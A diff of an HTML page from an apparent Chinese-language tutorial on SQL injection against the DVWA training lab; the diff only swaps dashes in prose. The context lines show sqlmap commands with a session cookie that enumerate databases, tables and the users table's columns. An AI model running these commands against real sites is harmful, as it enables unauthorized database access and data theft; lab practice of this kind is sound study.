@@ -209,7 +209,7 @@
 <p>在kali上上启动sqlmap，由于我是虚拟机上运行的sqlmap，只需要将localhost换成主机IP即可</p>
 <p>开始注入url:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span></span><br></pre></td></tr></table></figure>
-<p>由于这个注入页面需要登陆，所以还得加上cookie(chrome下cookie导出工具editthiscookie),过程中会不断让输入Y/N，可以加上参数–batch，来自动填写默认值。</p>
+<p>由于这个注入页面需要登陆，所以还得加上cookie(chrome下cookie导出工具editthiscookie),过程中会不断让输入Y/N，可以加上参数—batch，来自动填写默认值。</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
@@ -218,7 +218,7 @@
                 <div class="image-caption">_GCJPZ3_5T3T97_6K37__QN.png</div>
             </figure>
 <p>得到数据库类型版本信息(mysql)，服务器类型版本信息(apache，php)</p>
-<p>用–dbs查看数据库名</p>
+<p>用—dbs查看数据库名</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch --dbs</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -228,7 +228,7 @@
                 <div class="image-caption">7QU2_IR5VYECTF~_V~QPQ_6.png</div>
             </figure>
 <p>得到6个数据库名</p>
-<p>用–D xxx查看指定数据库，–tables查看数据库中表信息</p>
+<p>用—D xxx查看指定数据库，—tables查看数据库中表信息</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch -D dvwa --tables</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -238,7 +238,7 @@
                 <div class="image-caption">__O`CQDEB_3S_A_WIYRY089.png</div>
             </figure>
 <p>得到了数据库dvwa的所有表名</p>
-<p>用–T xxx查看指定表，–columns查看表的列信息</p>
+<p>用—T xxx查看指定表，—columns查看表的列信息</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
 <figure class="image-bubble">
                 <div class="img-lightbox">
